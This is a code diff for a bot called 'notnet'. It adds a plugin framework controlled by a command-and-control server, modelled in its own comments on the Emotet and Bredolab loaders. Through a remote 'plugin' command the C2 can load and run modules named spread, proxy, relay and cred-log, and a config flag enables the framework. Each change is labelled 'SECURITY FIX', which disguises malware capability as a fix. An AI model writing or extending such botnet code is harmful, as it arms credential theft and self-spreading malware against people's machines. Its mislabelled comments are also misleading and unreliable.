@@ -7,6 +7,7 @@
 #include "payload.h"
 #include "proxy.h"
 #include "relay.h"
+#include "plugin.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -2589,6 +2590,16 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 strncpy(bot->relay_token, value, sizeof(bot->relay_token) - 1);
                 bot->relay_token[sizeof(bot->relay_token) - 1] = '\0';
                 applied = 1;
+            } else if (strcmp(key, "plugin_enabled") == 0) {
+                /* SECURITY FIX (#92): strict 0/1 toggle for the
+                 * loader/plugin framework. 1 bootstraps the built-in
+                 * registry and enables the `plugin` command; 0 refuses
+                 * it. Takes effect on the next command. */
+                int v = atoi(value);
+                if (v == 0 || v == 1) {
+                    bot->plugin_enabled = (uint8_t)v;
+                    applied = 1;
+                }
             }
             
             if (applied) {
@@ -2741,6 +2752,93 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     log_info("CMD: %s", rbuf);
                 }
                 protocol_send_response(bot, CMD_RELAY, rbuf);
+            }
+        } else if (strncmp(cmd, CMD_PLUGIN, strlen(CMD_PLUGIN)) == 0) {
+            /* SECURITY FIX (#92): Loader/plugin framework (the
+             * Bredolab/Emotet split). The C2 dispatches capabilities
+             * by name against the built-in plugin registry:
+             *   plugin status                      -> list registry
+             *   plugin <name> load|run|unload|status
+             * v1 plugins are compile-time linked (spread, proxy,
+             * relay, cred-log; byovd planned), so 'load' flips
+             * registry state and runs the (no-op) load callback.
+             * Remote fetch of shared-object plugins is planned future
+             * work and must use the fail-closed payload_sha256 pin
+             * pattern. Refused entirely when plugin_enabled=0. */
+            if (!bot->plugin_enabled) {
+                protocol_send_response(bot, CMD_PLUGIN,
+                    "plugin: disabled (plugin_enabled=0)");
+                continue;
+            }
+            char *args = cmd + strlen(CMD_PLUGIN);
+            while (*args == ' ' || *args == '\t') args++;
+
+            if (args[0] == '\0') {
+                protocol_send_response(bot, CMD_PLUGIN,
+                    "plugin: usage 'plugin status' or 'plugin <name> load|run|unload|status'");
+                continue;
+            }
+            if (strcmp(args, "status") == 0) {
+                char pbuf[1024];
+                plugin_status(pbuf, sizeof(pbuf));
+                protocol_send_response(bot, CMD_PLUGIN, pbuf);
+                continue;
+            }
+
+            char pname[PLUGIN_NAME_MAX];
+            char pop[16];
+            if (sscanf(args, "%31s %15s", pname, pop) != 2) {
+                protocol_send_response(bot, CMD_PLUGIN,
+                    "plugin: usage 'plugin <name> load|run|unload|status'");
+                continue;
+            }
+
+            notnet_plugin_t *plg = plugin_find(pname);
+            if (!plg) {
+                char rbuf[128];
+                snprintf(rbuf, sizeof(rbuf),
+                         "plugin %s: unknown (see 'plugin status')", pname);
+                protocol_send_response(bot, CMD_PLUGIN, rbuf);
+                continue;
+            }
+
+            char rbuf[160];
+            if (strcmp(pop, "load") == 0) {
+                if (plg->loaded) {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: already loaded", pname);
+                } else if (plugin_load(bot, pname) == 0) {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: loaded", pname);
+                } else {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: load failed", pname);
+                }
+                protocol_send_response(bot, CMD_PLUGIN, rbuf);
+            } else if (strcmp(pop, "run") == 0) {
+                if (!plg->loaded) {
+                    snprintf(rbuf, sizeof(rbuf),
+                             "plugin %s: not loaded (load first)", pname);
+                } else if (plugin_run(bot, pname) == 0) {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: ran", pname);
+                } else {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: run failed", pname);
+                }
+                protocol_send_response(bot, CMD_PLUGIN, rbuf);
+            } else if (strcmp(pop, "unload") == 0) {
+                if (!plg->loaded) {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: not loaded", pname);
+                } else if (plugin_unload(bot, pname) == 0) {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: unloaded", pname);
+                } else {
+                    snprintf(rbuf, sizeof(rbuf), "plugin %s: unload failed", pname);
+                }
+                protocol_send_response(bot, CMD_PLUGIN, rbuf);
+            } else if (strcmp(pop, "status") == 0) {
+                snprintf(rbuf, sizeof(rbuf), "plugin %s: %s (%s)", pname,
+                         plg->loaded ? "loaded" : "unloaded",
+                         plg->description);
+                protocol_send_response(bot, CMD_PLUGIN, rbuf);
+            } else {
+                protocol_send_response(bot, CMD_PLUGIN,
+                    "plugin: usage 'plugin <name> load|run|unload|status'");
             }
         }
     }
@@ -3543,6 +3641,11 @@ int load_config(notnet_bot_t *bot, const char *path) {
         } else if (strcmp(key, "relay_token") == 0) {
             strncpy(bot->relay_token, value, sizeof(bot->relay_token) - 1);
             bot->relay_token[sizeof(bot->relay_token) - 1] = '\0';
+        } else if (strcmp(key, "plugin_enabled") == 0) {
+            /* SECURITY FIX (#92): loader/plugin framework toggle. The
+             * built-in plugin registry is bootstrapped at boot and the
+             * `plugin` C2 command dispatches plugins by name. */
+            bot->plugin_enabled = (atoi(value) != 0);
         }
     }
     
